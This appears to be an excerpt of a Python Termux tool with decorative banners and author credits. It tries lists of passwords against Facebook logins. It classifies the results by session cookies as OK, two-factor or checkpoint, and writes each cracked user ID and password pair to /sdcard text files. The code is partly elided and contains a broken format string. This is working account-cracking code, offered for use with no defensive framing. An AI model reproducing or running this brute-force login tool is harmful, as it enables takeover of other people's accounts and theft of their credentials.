...
| |  |_______.'  | || ||____|  |____|| || |  `._____.'   | || ||____|  |____|| || | |____| |___| | |
| |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 
...
\033[1;37m╔════════════════════════════════════════════╗
\033[1;31m│\033[1;32m☞  \033[1;32m 𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32m  Sagar Rajbanshi          \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32m Sagar Rajbanshi         \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32m Sagar Rajbanshi       \033[1;31m│
...
\033[1;31m│\033[1;32m☞  \033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄   \033[1;31m ➟   \033[1;32m Sagar Rajbanshi        \033[1;31m│
\033[1;37m╚🅑︎🅗︎🅣︎Help From Me  ANYTIME [Sagar Rajbanshi]\033[1;37m🅑︎🅗︎🅣︎╝
\033[1;91m==========================================================
...
def checks(ok,cp):
    if not len(ok) != 0:
        pass
    if len(cp) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mYAGHY-OK.txt' % (
            H, P, str(len(ok))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mYAGHY-CP.txt' %
              (H, P, str(len(cp))))
...
def my_tool_security():
    ...
    print(47*"-")
    print(c, 45*"-", wit)
    print("\t  Facebook : Sagar Rajbanshi")
    print("\t  Fb page  : Sagar Rajbanshi")
    print("\t  Github   : Sagar Rajbanshi")
    print(c, 45*"-")
    print(47*"-")
    try:
        ...
        print("\t Welcome To MR NAIB- MAFYIA 313 Tool ....")
        time.sleep(2)
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                os.system("play-audio NAIB_OK.mp3")
                print('\r\033[1;32m[NAIB-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/NAIB-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio NAIB_2F.mp3")
                    print('\r\033[1;34m[NAIB-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/NAIB-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio NAIB_CP.mp3")
                    print(f'\r\033[1;30m[NAIB-CP] '+uid+' [×] '+ps+ ' ')
                    open('/sdcard/NAIB-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[7:22]
                os.system("play-audio NAIB-OK.mp3")
                print('\r\033[1;32m[NAIB-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/NAIB-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
